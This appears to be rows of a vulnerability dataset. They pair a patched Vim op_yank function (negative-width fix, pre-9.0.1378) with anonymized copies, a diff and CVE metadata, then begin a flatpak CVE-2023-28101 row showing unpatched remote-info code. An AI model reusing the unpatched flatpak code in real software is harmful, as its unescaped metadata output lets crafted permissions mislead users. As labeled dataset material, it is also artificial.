	y_current = &newreg;
    else
	free_yank_all();	    // free previously yanked lines

    // If the cursor was in column 1 before and after the movement, and the
    // operator is not inclusive, the yank is always linewise.
    if (       oap->motion_type == MCHAR
	    && oap->start.col == 0
	    && !oap->inclusive
	    && (!oap->is_VIsual || *p_sel == 'o')
	    && !oap->block_mode
	    && oap->end.col == 0
	    && yanklines > 1)
    {
	yanktype = MLINE;
	--yankendlnum;
	--yanklines;
    }

    y_current->y_size = yanklines;
    y_current->y_type = yanktype;   // set the yank register type
    y_current->y_width = 0;
    y_current->y_array = lalloc_clear(sizeof(char_u *) * yanklines, TRUE);
    if (y_current->y_array == NULL)
    {
	y_current = curr;
	return FAIL;
    }
#ifdef FEAT_VIMINFO
    y_current->y_time_set = vim_time();
#endif

    y_idx = 0;
    lnum = oap->start.lnum;

    if (oap->block_mode)
    {
	// Visual block mode
	y_current->y_type = MBLOCK;	    // set the yank register type
	y_current->y_width = oap->end_vcol - oap->start_vcol;

	if (curwin->w_curswant == MAXCOL && y_current->y_width > 0)
	    y_current->y_width--;
    }

    for ( ; lnum <= yankendlnum; lnum++, y_idx++)
    {
	switch (y_current->y_type)
	{
	    case MBLOCK:
		block_prep(oap, &bd, lnum, FALSE);
		if (yank_copy_line(&bd, y_idx, oap->excl_tr_ws) == FAIL)
		    goto fail;
		break;

	    case MLINE:
		if ((y_current->y_array[y_idx] =
					    vim_strsave(ml_get(lnum))) == NULL)
		    goto fail;
		break;

	    case MCHAR:
		{
		    colnr_T startcol = 0, endcol = MAXCOL;
		    int	    is_oneChar = FALSE;
		    colnr_T cs, ce;

		    p = ml_get(lnum);
		    bd.startspaces = 0;
		    bd.endspaces = 0;

		    if (lnum == oap->start.lnum)
		    {
			startcol = oap->start.col;
			if (virtual_op)
			{
			    getvcol(curwin, &oap->start, &cs, NULL, &ce);
			    if (ce != cs && oap->start.coladd > 0)
			    {
				// Part of a tab selected -- but don't
				// double-count it.
				bd.startspaces = (ce - cs + 1)
							  - oap->start.coladd;
				if (bd.startspaces < 0)
				    bd.startspaces = 0;
				startcol++;
			    }
			}
		    }

		    if (lnum == oap->end.lnum)
		    {
			endcol = oap->end.col;
			if (virtual_op)
			{
			    getvcol(curwin, &oap->end, &cs, NULL, &ce);
			    if (p[endcol] == NUL || (cs + oap->end.coladd < ce
					// Don't add space for double-wide
					// char; endcol will be on last byte
					// of multi-byte char.
					&& (*mb_head_off)(p, p + endcol) == 0))
			    {
				if (oap->start.lnum == oap->end.lnum
					    && oap->start.col == oap->end.col)
				{
				    // Special case: inside a single char
				    is_oneChar = TRUE;
				    bd.startspaces = oap->end.coladd
					 - oap->start.coladd + oap->inclusive;
				    endcol = startcol;
				}
				else
				{
				    bd.endspaces = oap->end.coladd
							     + oap->inclusive;
				    endcol -= oap->inclusive;
				}
			    }
			}
		    }
		    if (endcol == MAXCOL)
			endcol = (colnr_T)STRLEN(p);
		    if (startcol > endcol || is_oneChar)
			bd.textlen = 0;
		    else
			bd.textlen = endcol - startcol + oap->inclusive;
		    bd.textstart = p + startcol;
		    if (yank_copy_line(&bd, y_idx, FALSE) == FAIL)
			goto fail;
		    break;
		}
		// NOTREACHED
	}
    }

    if (curr != y_current)	// append the new block to the old block
    {
	new_ptr = ALLOC_MULT(char_u *, curr->y_size + y_current->y_size);
	if (new_ptr == NULL)
	    goto fail;
	for (j = 0; j < curr->y_size; ++j)
	    new_ptr[j] = curr->y_array[j];
	vim_free(curr->y_array);
	curr->y_array = new_ptr;
#ifdef FEAT_VIMINFO
	curr->y_time_set = vim_time();
#endif

	if (yanktype == MLINE)	// MLINE overrides MCHAR and MBLOCK
	    curr->y_type = MLINE;

	// Concatenate the last line of the old block with the first line of
	// the new block, unless being Vi compatible.
	if (curr->y_type == MCHAR && vim_strchr(p_cpo, CPO_REGAPPEND) == NULL)
	{
	    pnew = alloc(STRLEN(curr->y_array[curr->y_size - 1])
					  + STRLEN(y_current->y_array[0]) + 1);
	    if (pnew == NULL)
	    {
		y_idx = y_current->y_size - 1;
		goto fail;
	    }
	    STRCPY(pnew, curr->y_array[--j]);
	    STRCAT(pnew, y_current->y_array[0]);
	    vim_free(curr->y_array[j]);
	    vim_free(y_current->y_array[0]);
	    curr->y_array[j++] = pnew;
	    y_idx = 1;
	}
	else
	    y_idx = 0;
	while (y_idx < y_current->y_size)
	    curr->y_array[j++] = y_current->y_array[y_idx++];
	curr->y_size = j;
	vim_free(y_current->y_array);
	y_current = curr;
    }

    if (mess)			// Display message about yank?
    {
	if (yanktype == MCHAR
		&& !oap->block_mode
		&& yanklines == 1)
	    yanklines = 0;
	// Some versions of Vi use "">="" here, some don't...
	if (yanklines > p_report)
	{
	    char namebuf[100];

	    if (oap->regname == NUL)
		*namebuf = NUL;
	    else
		vim_snprintf(namebuf, sizeof(namebuf),
						_("" into \""%c""), oap->regname);

	    // redisplay now, so message is not deleted
	    update_topline_redraw();
	    if (oap->block_mode)
	    {
		smsg(NGETTEXT(""block of %ld line yanked%s"",
				     ""block of %ld lines yanked%s"", yanklines),
			yanklines, namebuf);
	    }
	    else
	    {
		smsg(NGETTEXT(""%ld line yanked%s"",
					      ""%ld lines yanked%s"", yanklines),
			yanklines, namebuf);
	    }
	}
    }

    if ((cmdmod.cmod_flags & CMOD_LOCKMARKS) == 0)
    {
	// Set ""'["" and ""']"" marks.
	curbuf->b_op_start = oap->start;
	curbuf->b_op_end = oap->end;
	if (yanktype == MLINE && !oap->block_mode)
	{
	    curbuf->b_op_start.col = 0;
	    curbuf->b_op_end.col = MAXCOL;
	}
    }

#ifdef FEAT_CLIPBOARD
    // If we were yanking to the '*' register, send result to clipboard.
    // If no register was specified, and ""unnamed"" in 'clipboard', make a copy
    // to the '*' register.
    if (clip_star.available
	    && (curr == &(y_regs[STAR_REGISTER])
		|| (!deleting && oap->regname == 0
		   && ((clip_unnamed | clip_unnamed_saved) & CLIP_UNNAMED))))
    {
	if (curr != &(y_regs[STAR_REGISTER]))
	    // Copy the text from register 0 to the clipboard register.
	    copy_yank_reg(&(y_regs[STAR_REGISTER]));

	clip_own_selection(&clip_star);
	clip_gen_set_selection(&clip_star);
# ifdef FEAT_X11
	did_star = TRUE;
# endif
    }

# ifdef FEAT_X11
    // If we were yanking to the '+' register, send result to selection.
    // Also copy to the '*' register, in case auto-select is off.  But not when
    // 'clipboard' has ""unnamedplus"" and not ""unnamed""; and not when
    // deleting and both ""unnamedplus"" and ""unnamed"".
    if (clip_plus.available
	    && (curr == &(y_regs[PLUS_REGISTER])
		|| (!deleting && oap->regname == 0
		  && ((clip_unnamed | clip_unnamed_saved) &
							  CLIP_UNNAMED_PLUS))))
    {
	if (curr != &(y_regs[PLUS_REGISTER]))
	    // Copy the text from register 0 to the clipboard register.
	    copy_yank_reg(&(y_regs[PLUS_REGISTER]));

	clip_own_selection(&clip_plus);
	clip_gen_set_selection(&clip_plus);
	if (!clip_isautosel_star()
		&& !clip_isautosel_plus()
		&& !((clip_unnamed | clip_unnamed_saved) == CLIP_UNNAMED_PLUS)
		&& !(deleting && (clip_unnamed | clip_unnamed_saved)
					 == (CLIP_UNNAMED | CLIP_UNNAMED_PLUS))
		&& !did_star
		&& curr == &(y_regs[PLUS_REGISTER]))
	{
	    copy_yank_reg(&(y_regs[STAR_REGISTER]));
	    clip_own_selection(&clip_star);
	    clip_gen_set_selection(&clip_star);
	}
    }
# endif
#endif

#if defined(FEAT_EVAL)
    if (!deleting && has_textyankpost())
	yank_do_autocmd(oap, y_current);
#endif

    return OK;

fail:		// free the allocated lines
    free_yank(y_idx + 1);
    y_current = curr;
    return FAIL;
}","int
op_yank(oparg_T *VAR_0, int VAR_1, int VAR_2)
{
    long		VAR_3;		/* COMMENT_0 */
    yankreg_T		*VAR_4;		/* COMMENT_1 */
    yankreg_T		VAR_5;		/* COMMENT_2 */
    char_u		**VAR_6;
    linenr_T		VAR_7;		/* COMMENT_3 */
    long		VAR_8;
    int			VAR_9 = VAR_0->motion_type;
    long		VAR_10 = VAR_0->line_count;
    linenr_T		VAR_11 = VAR_0->end.lnum;
    char_u		*VAR_12;
    char_u		*VAR_13;
    struct block_def	VAR_14;
#if defined(VAR_15) && defined(VAR_16)
    int			VAR_17 = FALSE;
#endif

				    /* COMMENT_4 */
    if (VAR_0->regname != 0 && !valid_yank_reg(VAR_0->regname, TRUE))
    {
	beep_flush();
	return VAR_18;
    }
    if (VAR_0->regname == '_')	    /* COMMENT_5 */
	return VAR_19;

#ifdef VAR_15
    if (!VAR_20.available && VAR_0->regname == '*')
	VAR_0->regname = 0;
    else if (!VAR_21.available && VAR_0->regname == '+')
	VAR_0->regname = 0;
#endif

    if (!VAR_1)		    /* COMMENT_6 */
	get_yank_register(VAR_0->regname, TRUE);

    VAR_4 = VAR_22;
				    /* COMMENT_7 */
    if (VAR_23 && VAR_22->y_array != NULL)
	VAR_22 = &VAR_5;
    else
	free_yank_all();	    /* COMMENT_8 */

    /* COMMENT_9 */
    /* COMMENT_10 */
    if (       VAR_0->motion_type == VAR_24
	    && VAR_0->start.col == 0
	    && !VAR_0->inclusive
	    && (!VAR_0->is_VIsual || *VAR_25 == 'o')
	    && !VAR_0->block_mode
	    && VAR_0->end.col == 0
	    && VAR_10 > 1)
    {
	VAR_9 = VAR_26;
	--VAR_11;
	--VAR_10;
    }

    VAR_22->y_size = VAR_10;
    VAR_22->y_type = VAR_9;   /* COMMENT_11 */
    VAR_22->y_width = 0;
    VAR_22->y_array = lalloc_clear(sizeof(char_u *) * VAR_10, TRUE);
    if (VAR_22->y_array == NULL)
    {
	VAR_22 = VAR_4;
	return VAR_18;
    }
#ifdef VAR_27
    VAR_22->y_time_set = vim_time();
#endif

    VAR_3 = 0;
    VAR_7 = VAR_0->start.lnum;

    if (VAR_0->block_mode)
    {
	/* COMMENT_12 */
	VAR_22->y_type = VAR_28;	    /* COMMENT_11 */
	VAR_22->y_width = VAR_0->end_vcol - VAR_0->start_vcol;

	if (VAR_29->w_curswant == VAR_30 && VAR_22->y_width > 0)
	    VAR_22->y_width--;
    }

    for ( ; VAR_7 <= VAR_11; VAR_7++, VAR_3++)
    {
	switch (VAR_22->y_type)
	{
	    case VAR_28:
		block_prep(VAR_0, &VAR_14, VAR_7, FALSE);
		if (yank_copy_line(&VAR_14, VAR_3, VAR_0->excl_tr_ws) == VAR_18)
		    goto fail;
		break;

	    case VAR_26:
		if ((VAR_22->y_array[VAR_3] =
					    vim_strsave(ml_get(VAR_7))) == NULL)
		    goto fail;
		break;

	    case VAR_24:
		{
		    colnr_T VAR_31 = 0, VAR_32 = VAR_30;
		    int	    VAR_33 = FALSE;
		    colnr_T VAR_34, VAR_35;

		    VAR_12 = ml_get(VAR_7);
		    VAR_14.startspaces = 0;
		    VAR_14.endspaces = 0;

		    if (VAR_7 == VAR_0->start.lnum)
		    {
			VAR_31 = VAR_0->start.col;
			if (VAR_36)
			{
			    getvcol(VAR_29, &VAR_0->start, &VAR_34, NULL, &VAR_35);
			    if (VAR_35 != VAR_34 && VAR_0->start.coladd > 0)
			    {
				/* COMMENT_13 */
				/* COMMENT_14 */
				VAR_14.startspaces = (VAR_35 - VAR_34 + 1)
							  - VAR_0->start.coladd;
				if (VAR_14.startspaces < 0)
				    VAR_14.startspaces = 0;
				VAR_31++;
			    }
			}
		    }

		    if (VAR_7 == VAR_0->end.lnum)
		    {
			VAR_32 = VAR_0->end.col;
			if (VAR_36)
			{
			    getvcol(VAR_29, &VAR_0->end, &VAR_34, NULL, &VAR_35);
			    if (VAR_12[VAR_32] == VAR_37 || (VAR_34 + VAR_0->end.coladd < VAR_35
					/* COMMENT_15 */
					/* COMMENT_16 */
					/* COMMENT_17 */
					&& (*VAR_38)(VAR_12, VAR_12 + VAR_32) == 0))
			    {
				if (VAR_0->start.lnum == VAR_0->end.lnum
					    && VAR_0->start.col == VAR_0->end.col)
				{
				    /* COMMENT_18 */
				    VAR_33 = TRUE;
				    VAR_14.startspaces = VAR_0->end.coladd
					 - VAR_0->start.coladd + VAR_0->inclusive;
				    VAR_32 = VAR_31;
				}
				else
				{
				    VAR_14.endspaces = VAR_0->end.coladd
							     + VAR_0->inclusive;
				    VAR_32 -= VAR_0->inclusive;
				}
			    }
			}
		    }
		    if (VAR_32 == VAR_30)
			VAR_32 = (colnr_T)STRLEN(VAR_12);
		    if (VAR_31 > VAR_32 || VAR_33)
			VAR_14.textlen = 0;
		    else
			VAR_14.textlen = VAR_32 - VAR_31 + VAR_0->inclusive;
		    VAR_14.textstart = VAR_12 + VAR_31;
		    if (yank_copy_line(&VAR_14, VAR_3, FALSE) == VAR_18)
			goto fail;
		    break;
		}
		/* COMMENT_19 */
	}
    }

    if (VAR_4 != VAR_22)	/* COMMENT_20 */
    {
	VAR_6 = ALLOC_MULT(char_u *, VAR_4->y_size + VAR_22->y_size);
	if (VAR_6 == NULL)
	    goto fail;
	for (VAR_8 = 0; VAR_8 < VAR_4->y_size; ++VAR_8)
	    VAR_6[VAR_8] = VAR_4->y_array[VAR_8];
	vim_free(VAR_4->y_array);
	VAR_4->y_array = VAR_6;
#ifdef VAR_27
	VAR_4->y_time_set = vim_time();
#endif

	if (VAR_9 == VAR_26)	/* COMMENT_21 */
	    VAR_4->y_type = VAR_26;

	/* COMMENT_22 */
	/* COMMENT_23 */
	if (VAR_4->y_type == VAR_24 && vim_strchr(VAR_39, VAR_40) == NULL)
	{
	    VAR_13 = alloc(STRLEN(VAR_4->y_array[VAR_4->y_size - 1])
					  + STRLEN(VAR_22->y_array[0]) + 1);
	    if (VAR_13 == NULL)
	    {
		VAR_3 = VAR_22->y_size - 1;
		goto fail;
	    }
	    STRCPY(VAR_13, VAR_4->y_array[--VAR_8]);
	    STRCAT(VAR_13, VAR_22->y_array[0]);
	    vim_free(VAR_4->y_array[VAR_8]);
	    vim_free(VAR_22->y_array[0]);
	    VAR_4->y_array[VAR_8++] = VAR_13;
	    VAR_3 = 1;
	}
	else
	    VAR_3 = 0;
	while (VAR_3 < VAR_22->y_size)
	    VAR_4->y_array[VAR_8++] = VAR_22->y_array[VAR_3++];
	VAR_4->y_size = VAR_8;
	vim_free(VAR_22->y_array);
	VAR_22 = VAR_4;
    }

    if (VAR_2)			/* COMMENT_24 */
    {
	if (VAR_9 == VAR_24
		&& !VAR_0->block_mode
		&& VAR_10 == 1)
	    VAR_10 = 0;
	/* COMMENT_25 */
	if (VAR_10 > VAR_41)
	{
	    char VAR_42[100];

	    if (VAR_0->regname == VAR_37)
		*VAR_42 = VAR_37;
	    else
		vim_snprintf(VAR_42, sizeof(VAR_42),
						_("" into \""%c""), VAR_0->regname);

	    /* COMMENT_26 */
	    update_topline_redraw();
	    if (VAR_0->block_mode)
	    {
		smsg(NGETTEXT(""block of %ld line yanked%s"",
				     ""block of %ld lines yanked%s"", VAR_10),
			VAR_10, VAR_42);
	    }
	    else
	    {
		smsg(NGETTEXT(""%ld line yanked%s"",
					      ""%ld lines yanked%s"", VAR_10),
			VAR_10, VAR_42);
	    }
	}
    }

    if ((VAR_43.cmod_flags & VAR_44) == 0)
    {
	/* COMMENT_27 */
	VAR_45->b_op_start = VAR_0->start;
	VAR_45->b_op_end = VAR_0->end;
	if (VAR_9 == VAR_26 && !VAR_0->block_mode)
	{
	    VAR_45->b_op_start.col = 0;
	    VAR_45->b_op_end.col = VAR_30;
	}
    }

#ifdef VAR_15
    /* COMMENT_28 */
    /* COMMENT_29 */
    /* COMMENT_30 */
    if (VAR_20.available
	    && (VAR_4 == &(VAR_46[VAR_47])
		|| (!VAR_1 && VAR_0->regname == 0
		   && ((VAR_48 | VAR_49) & VAR_50))))
    {
	if (VAR_4 != &(VAR_46[VAR_47]))
	    /* COMMENT_31 */
	    copy_yank_reg(&(VAR_46[VAR_47]));

	clip_own_selection(&VAR_20);
	clip_gen_set_selection(&VAR_20);
# ifdef VAR_16
	VAR_17 = TRUE;
# endif
    }

# ifdef VAR_16
    /* COMMENT_32 */
    /* COMMENT_33 */
    /* COMMENT_34 */
    /* COMMENT_35 */
    if (VAR_21.available
	    && (VAR_4 == &(VAR_46[VAR_51])
		|| (!VAR_1 && VAR_0->regname == 0
		  && ((VAR_48 | VAR_49) &
							  VAR_52))))
    {
	if (VAR_4 != &(VAR_46[VAR_51]))
	    /* COMMENT_31 */
	    copy_yank_reg(&(VAR_46[VAR_51]));

	clip_own_selection(&VAR_21);
	clip_gen_set_selection(&VAR_21);
	if (!clip_isautosel_star()
		&& !clip_isautosel_plus()
		&& !((VAR_48 | VAR_49) == VAR_52)
		&& !(VAR_1 && (VAR_48 | VAR_49)
					 == (VAR_50 | VAR_52))
		&& !VAR_17
		&& VAR_4 == &(VAR_46[VAR_51]))
	{
	    copy_yank_reg(&(VAR_46[VAR_47]));
	    clip_own_selection(&VAR_20);
	    clip_gen_set_selection(&VAR_20);
	}
    }
# endif
#endif

#if defined(VAR_53)
    if (!VAR_1 && has_textyankpost())
	yank_do_autocmd(VAR_0, VAR_22);
#endif

    return VAR_19;

fail:		/* COMMENT_36 */
    free_yank(VAR_3 + 1);
    VAR_22 = VAR_4;
    return VAR_18;
}",vim/c99cbf8f289bdda5d4a77d7ec415850a520330ba/register.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -122,6 +122,8 @@
 				// double-count it.
 				bd.startspaces = (ce - cs + 1)
 							  - oap->start.coladd;
+				if (bd.startspaces < 0)
+				    bd.startspaces = 0;
 				startcol++;
 			    }
 			}","{'deleted_lines': [], 'added_lines': ['\t\t\t\tif (bd.startspaces < 0)', '\t\t\t\t    bd.startspaces = 0;']}",True,Incorrect Calculation of Buffer Size in GitHub repository vim/vim prior to 9.0.1378.,6.6,MEDIUM,1,valid,2023-03-04T14:13:10Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Ensure special characters in permissions and metadata are escaped

This prevents someone from placing special characters in order to
manipulate the appearance of the permissions list.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>",6cac99dafe6003c8a4bd5666341c217876536869,https://github.com/flatpak/flatpak/commit/6cac99dafe6003c8a4bd5666341c217876536869,app/flatpak-builtins-remote-info.c,flatpak_builtin_remote_info,"gboolean
flatpak_builtin_remote_info (int argc, char **argv, GCancellable *cancellable, GError **error)
{
g_autoptr(GOptionContext) context = NULL;
g_autoptr(GPtrArray) dirs = NULL;
g_autoptr(FlatpakDir) preferred_dir = NULL;
g_autoptr(GVariant) commit_v = NULL;
const char *remote;
const char *pref;
g_autofree char *default_branch = NULL;
FlatpakKinds kinds;
FlatpakKinds matched_kinds;
g_autofree char *match_id = NULL;
g_autofree char *match_arch = NULL;
g_autofree char *match_branch = NULL;
g_autoptr(FlatpakDecomposed) ref = NULL;
g_autofree char *commit = NULL;
g_autofree char *parent = NULL;
g_autoptr(FlatpakRemoteState) state = NULL;
gboolean friendly = TRUE;
const char *xa_metadata = NULL;
const char *collection_id = NULL;
const char *eol = NULL;
const char *eol_rebase = NULL;
g_autoptr(GKeyFile) metakey = NULL;
guint64 installed_size = 0;
guint64 download_size = 0;
g_autofree char *formatted_installed_size = NULL;
g_autofree char *formatted_download_size = NULL;
const gchar *subject = NULL;
guint64 timestamp;
g_autofree char *formatted_timestamp = NULL;
VarMetadataRef sparse_cache;
context = g_option_context_new (_("" REMOTE REF - Show information about an application or runtime in a remote""));
g_option_context_set_translation_domain (context, GETTEXT_PACKAGE);
if (!flatpak_option_context_parse (context, options, &argc, &argv,
FLATPAK_BUILTIN_FLAG_STANDARD_DIRS, &dirs, cancellable, error))
return FALSE;
if (!opt_app && !opt_runtime)
opt_app = opt_runtime = TRUE;
if (argc < 3)
return usage_error (context, _(""REMOTE and REF must be specified""), error);
remote = argv[1];
pref = argv[2];
if (!flatpak_resolve_duplicate_remotes (dirs, remote, &preferred_dir, cancellable, error))
return FALSE;
default_branch = flatpak_dir_get_remote_default_branch (preferred_dir, remote);
kinds = flatpak_kinds_from_bools (opt_app, opt_runtime);
if (!flatpak_split_partial_ref_arg (pref, kinds, opt_arch, NULL,
&matched_kinds, &match_id, &match_arch, &match_branch, error))
return FALSE;
state = get_remote_state (preferred_dir, remote, opt_cached, opt_sideloaded, match_arch, NULL, NULL, error);
if (state == NULL)
return FALSE;
ref = flatpak_dir_find_remote_ref (preferred_dir, state, match_id, match_branch, default_branch, match_arch,
matched_kinds, cancellable, error);
if (ref == NULL)
return FALSE;
if (opt_cached)
{
if (opt_commit)
commit = g_strdup (opt_commit);
else if (!flatpak_remote_state_lookup_ref (state, flatpak_decomposed_get_ref (ref),
&commit, NULL, NULL, NULL, error))
{
g_assert (error == NULL || *error != NULL);
return FALSE;
}
}
else
{
commit_v = flatpak_remote_state_load_ref_commit (state, preferred_dir, flatpak_decomposed_get_ref (ref),
opt_commit, NULL, &commit, cancellable, error);
if (commit_v == NULL)
return FALSE;
}
if (flatpak_remote_state_lookup_sparse_cache (state, flatpak_decomposed_get_ref (ref),
&sparse_cache, NULL))
{
eol = var_metadata_lookup_string (sparse_cache, FLATPAK_SPARSE_CACHE_KEY_ENDOFLINE, NULL);
eol_rebase = var_metadata_lookup_string (sparse_cache, FLATPAK_SPARSE_CACHE_KEY_ENDOFLINE_REBASE, NULL);
}
if (opt_show_ref || opt_show_commit || opt_show_parent || opt_show_metadata || opt_show_runtime || opt_show_sdk)
friendly = FALSE;
if (friendly)
{
int len;
int rows, cols;
int width;
g_autoptr(AsMetadata) mdata = as_metadata_new ();
AsComponent *app = NULL;
const char *version = NULL;
const char *license = NULL;
g_autofree char *id = flatpak_decomposed_dup_id (ref);
flatpak_get_window_size (&rows, &cols);
flatpak_dir_load_appstream_store (preferred_dir, remote, id, mdata, NULL, NULL);
app = as_store_find_app (mdata, flatpak_decomposed_get_ref (ref));
if (app)
{
const char *name = as_component_get_name (app);
const char *comment = as_component_get_summary (app);
print_wrapped (MIN (cols, 80), ""\n%s - %s\n"", name, comment);
version = as_app_get_version (app);
license = as_component_get_project_license (app);
}
if (commit_v)
{
VarCommitRef var_commit = var_commit_from_gvariant (commit_v);
VarMetadataRef commit_metadata;
subject = var_commit_get_subject (var_commit);
parent = ostree_commit_get_parent (commit_v);
timestamp = ostree_commit_get_timestamp (commit_v);
commit_metadata = var_commit_get_metadata (var_commit);
xa_metadata = var_metadata_lookup_string (commit_metadata, ""xa.metadata"", NULL);
if (xa_metadata == NULL)
g_printerr (_(""Warning: Commit has no flatpak metadata\n""));
else
{
metakey = g_key_file_new ();
if (!g_key_file_load_from_data (metakey, xa_metadata, -1, 0, error))
return FALSE;
}
collection_id = var_metadata_lookup_string (commit_metadata, ""ostree.collection-binding"", NULL);
installed_size = GUINT64_FROM_BE (var_metadata_lookup_uint64 (commit_metadata, ""xa.installed-size"", 0));
download_size = GUINT64_FROM_BE (var_metadata_lookup_uint64 (commit_metadata, ""xa.download-size"", 0));
formatted_installed_size = g_format_size (installed_size);
formatted_download_size = g_format_size (download_size);
formatted_timestamp = format_timestamp (timestamp);
}
len = 0;
len = MAX (len, g_utf8_strlen (_(""ID:""), -1));
len = MAX (len, g_utf8_strlen (_(""Ref:""), -1));
len = MAX (len, g_utf8_strlen (_(""Arch:""), -1));
len = MAX (len, g_utf8_strlen (_(""Branch:""), -1));
if (version != NULL)
len = MAX (len, g_utf8_strlen (_(""Version:""), -1));
if (license != NULL)
len = MAX (len, g_utf8_strlen (_(""License:""), -1));
if (collection_id != NULL)
len = MAX (len, g_utf8_strlen (_(""Collection:""), -1));
if (formatted_download_size)
len = MAX (len, g_utf8_strlen (_(""Download:""), -1));
if (formatted_installed_size)
len = MAX (len, g_utf8_strlen (_(""Installed:""), -1));
if (flatpak_decomposed_is_app (ref) == 0 && metakey != NULL)
{
len = MAX (len, g_utf8_strlen (_(""Runtime:""), -1));
len = MAX (len, g_utf8_strlen (_(""Sdk:""), -1));
}
if (formatted_timestamp)
len = MAX (len, g_utf8_strlen (_(""Date:""), -1));
if (subject)
len = MAX (len, g_utf8_strlen (_(""Subject:""), -1));
len = MAX (len, g_utf8_strlen (_(""Commit:""), -1));
if (parent)
len = MAX (len, g_utf8_strlen (_(""Parent:""), -1));
if (eol)
len = MAX (len, strlen (_(""End-of-life:"")));
if (eol_rebase)
len = MAX (len, strlen (_(""End-of-life-rebase:"")));
if (opt_log)
len = MAX (len, g_utf8_strlen (_(""History:""), -1));
width = cols - (len + 1);
print_aligned (len, _(""ID:""), id);
print_aligned (len, _(""Ref:""), flatpak_decomposed_get_ref (ref));
print_aligned_take (len, _(""Arch:""), flatpak_decomposed_dup_arch (ref));
print_aligned_take (len, _(""Branch:""), flatpak_decomposed_dup_branch (ref));
if (version != NULL)
print_aligned (len, _(""Version:""), version);
if (license != NULL)
print_aligned (len, _(""License:""), license);
if (collection_id != NULL)
print_aligned (len, _(""Collection:""), collection_id);
if (formatted_download_size)
print_aligned (len, _(""Download:""), formatted_download_size);
if (formatted_installed_size)
print_aligned (len, _(""Installed:""), formatted_installed_size);
if (flatpak_decomposed_is_app (ref) && metakey != NULL)
{
g_autofree char *runtime = g_key_file_get_string (metakey, ""Application"", ""runtime"", error);
print_aligned (len, _(""Runtime:""), runtime ? runtime : ""-"");
}
if (flatpak_decomposed_is_app (ref) && metakey != NULL)
{
g_autofree char *sdk = g_key_file_get_string (metakey, ""Application"", ""sdk"", error);
print_aligned (len, _(""Sdk:""), sdk ? sdk : ""-"");
}
g_print (""\n"");
{
g_autofree char *formatted_commit = ellipsize_string (commit, width);
print_aligned (len, _(""Commit:""), formatted_commit);
}
if (parent)
{
g_autofree char *formatted_commit = ellipsize_string (parent, width);
print_aligned (len, _(""Parent:""), formatted_commit);
}
if (eol)
{
g_autofree char *formatted_eol = ellipsize_string (eol, width);
print_aligned (len, _(""End-of-life:""), formatted_eol);
}
if (eol_rebase)
{
g_autofree char *formatted_eol = ellipsize_string (eol_rebase, width);
print_aligned (len, _(""End-of-life-rebase:""), formatted_eol);
}
if (subject)
print_aligned (len, _(""Subject:""), subject);
if (formatted_timestamp)
print_aligned (len, _(""Date:""), formatted_timestamp);
if (opt_log)
{
g_autofree char *p = g_strdup (parent);
print_aligned (len, _(""History:""), ""\n"");
while (p)
{
g_autofree char *p_parent = NULL;
const gchar *p_subject;
guint64 p_timestamp;
g_autofree char *p_formatted_timestamp = NULL;
g_autoptr(GVariant) p_commit_v = NULL;
VarCommitRef p_commit;
p_commit_v = flatpak_remote_state_load_ref_commit (state, preferred_dir, flatpak_decomposed_get_ref (ref),
p, NULL, NULL, cancellable, NULL);
if (p_commit_v == NULL)
break;
p_parent = ostree_commit_get_parent (p_commit_v);
p_timestamp = ostree_commit_get_timestamp (p_commit_v);
p_formatted_timestamp = format_timestamp (p_timestamp);
p_commit = var_commit_from_gvariant (p_commit_v);
p_subject = var_commit_get_subject (p_commit);
print_aligned (len, _("" Commit:""), p);
print_aligned (len, _("" Subject:""), p_subject);
print_aligned (len, _("" Date:""), p_formatted_timestamp);
g_free (p);
p = g_steal_pointer (&p_parent);
if (p)
g_print (""\n"");
}
}
}
else
{
g_autoptr(GVariant) c_v = NULL;
g_autofree char *c = g_strdup (commit);
if (commit_v)
c_v = g_variant_ref (commit_v);
do
{
g_autofree char *p = NULL;
g_autoptr(GVariant) c_m = NULL;
gboolean first = TRUE;
if (c_v)
{
c_m = g_variant_get_child_value (c_v, 0);
p = ostree_commit_get_parent (c_v);
}
if (c_m)
{
g_variant_lookup (c_m, ""xa.metadata"", ""&s"", &xa_metadata);
if (xa_metadata == NULL)
g_printerr (_(""Warning: Commit %s has no flatpak metadata\n""), c);
else
{
metakey = g_key_file_new ();
if (!g_key_file_load_from_data (metakey, xa_metadata, -1, 0, error))
return FALSE;
}
}
if (opt_show_ref)
{
maybe_print_space (&first);
g_print (""%s"", flatpak_decomposed_get_ref (ref));
}
if (opt_show_commit)
{
maybe_print_space (&first);
g_print (""%s"", c);
}
if (opt_show_parent)
{
maybe_print_space (&first);
g_print (""%s"", p ? p : ""-"");
}
if (opt_show_runtime)
{
g_autofree char *runtime = NULL;
maybe_print_space (&first);
if (metakey)
runtime = g_key_file_get_string (metakey, flatpak_decomposed_get_kind_metadata_group (ref), ""runtime"", NULL);
g_print (""%s"", runtime ? runtime : ""-"");
}
if (opt_show_sdk)
{
g_autofree char *sdk = NULL;
maybe_print_space (&first);
if (metakey)
sdk = g_key_file_get_string (metakey, flatpak_decomposed_get_kind_metadata_group (ref), ""sdk"", NULL);
g_print (""%s"", sdk ? sdk : ""-"");
}
if (!first)
g_print (""\n"");
if (opt_show_metadata)
{
g_print (""%s"", xa_metadata ? xa_metadata : """");
if (xa_metadata == NULL || !g_str_has_suffix (xa_metadata, ""\n""))
g_print (""\n"");
}
g_free (c);
c = g_steal_pointer (&p);
if (c_v)
g_variant_unref (c_v);
c_v = NULL;
if (c && opt_log)
c_v = flatpak_remote_state_load_ref_commit (state, preferred_dir,
flatpak_decomposed_get_ref (ref),
c, NULL, NULL, cancellable, NULL);
}
while (c_v != NULL);
}
return TRUE;
}","gboolean
flatpak_builtin_remote_info (int VAR_0, char **VAR_1, GCancellable *VAR_2, GError **VAR_3)
{
VAR_4(GOptionContext) VAR_5 = NULL;
VAR_4(GPtrArray) VAR_6 = NULL;
VAR_4(FlatpakDir) VAR_7 = NULL;
VAR_4(GVariant) VAR_8 = NULL;
const char *VAR_9;
const char *VAR_10;
g_autofree char *VAR_11 = NULL;
FlatpakKinds VAR_12;
FlatpakKinds VAR_13;
g_autofree char *VAR_14 = NULL;
g_autofree char *VAR_15 = NULL;
g_autofree char *VAR_16 = NULL;
VAR_4(FlatpakDecomposed) VAR_17 = NULL;
g_autofree char *VAR_18 = NULL;
